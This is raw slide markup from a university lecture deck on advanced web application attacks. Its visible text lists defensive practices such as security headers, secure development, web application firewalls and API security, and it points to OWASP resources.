            <a:ext cx="171069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10. Current Security Trends &amp; Best Practices (2025)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1322116"/>
            <a:ext cx="6993329" cy="716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10.1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Defe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 in Depth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Mul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tiple layers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of security controls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Not relying on single defense mechanism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pplication-level + infrastructure-level controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="32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10.2 Secure Developm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ent Lifecycle (SDLC)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integrated from design phase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egular code reviews and security testing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Automated vulner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ability s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canning in CI/CD</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="474979" indent="-237490" lvl="1">
              <a:lnSpc>
                <a:spcPts val="3299"/>
              </a:lnSpc>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pP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Security training for develop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2199" spc="-6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ers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3299"/>
              </a:lnSpc>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3899"/>
              </a:lnSpc>
            </a:pP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10.3 Modern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2599" spc="-77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Security Headers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3299"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2199" spc="-6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Content-Security-Policy: default-src 'self'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3299"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2199" spc="-6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X-Fr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2199" spc="-6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ame-Options: DENY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3299"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2199" spc="-6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X-Content-Type-Options: nosniff</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3299"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2199" spc="-6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Strict-Transport-Security: max-age=31536000</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3299"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2199" spc="-65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Referrer-Policy: strict-origin-when-cross-origin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8551" y="1312591"/>
            <a:ext cx="6668304" cy="432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10.4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Web Appl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ication Firewalls (WAF)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ModSecurity for open-source WAF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Cl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oudflare, AWS WAF for cloud-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ased protection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CRS (Core Rule Set) for p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atte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rn matching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10.5 API </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" spc="-78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Security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API rate limiting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API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v</a:t>
            </a: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ersioning and deprecation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OAuth 2.0 / OpenID Connect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="474983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GraphQL-specific vulnerabilities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491327"/>
            <a:ext cx="16201636" cy="333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200" spc="-66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Advanced web application attacks require an understanding of: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Top 10 vulnerabilities in depth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Multiple injection attack types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Session and authentication mechanisms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File upload security considerations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Defense mechanisms and remediation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3300"/>
              </a:lnSpc>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3300"/>
              </a:lnSpc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Effective security testing combines manual techniques with automated tools, always following responsible disclosure practices.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15522" y="381000"/>
            <a:ext cx="1505728" cy="810556"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="2007638" cy="10807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554" y="239221"/>
              <a:ext cx="991633" cy="602300"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="602300" w="991633">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="991633" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991633" y="602299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="602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86" r="0" b="-6286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10110" y="184552"/>
              <a:ext cx="714315" cy="711636"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="711636" w="714315">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="714315" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="714315" y="711637"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="711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7147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ADDITIONAL RESOURCES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1491327"/>
            <a:ext cx="16201636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Web Security Testing Guide: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" spc="-66" u="sng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  <a:hlinkClick r:id="rId3" tooltip="https://owasp.org/www-project-web-security-testing-guide/"/>
              </a:rPr>
              <a:t>https://owasp.org/www-project-web-security-testing-guide/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Project Top 10: https://owasp.org/www-project-top-ten</a:t>
            </a:r>
          </a:p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 spc="-66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OWASP Top 10 - 2025: https://owasp.org/Top10/2025/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15522" y="381000"/>
            <a:ext cx="1505728" cy="810556"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="2007638" cy="10807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2978" lIns="22978" bIns="22978" rIns="229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554" y="239221"/>
              <a:ext cx="991633" cy="602300"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="602300" w="991633">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="991633" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991633" y="602299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="602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86" r="0" b="-6286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10110" y="184552"/>
              <a:ext cx="714315" cy="711636"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="711636" w="714315">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="714315" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="714315" y="711637"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="711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14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582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6053" y="4096993"/>
            <a:ext cx="8324850" cy="2093014"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="11099800" cy="27906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51122"/>
              <a:ext cx="11099800" cy="739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099800" cy="172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254" strike="noStrike" u="none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Ethical Hacking Overview</dc:description>
  <dc:identifier>DAG88RbF0CM</dc:identifier>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2011-08-01T06:04:30Z</dcterms:modified>
  <cp:revision>1</cp:revision>
  <dc:title>Lecture-09-CCS6324 -  Advanced Web Application Attacks</dc:title>
</cp:coreProperties>
</file>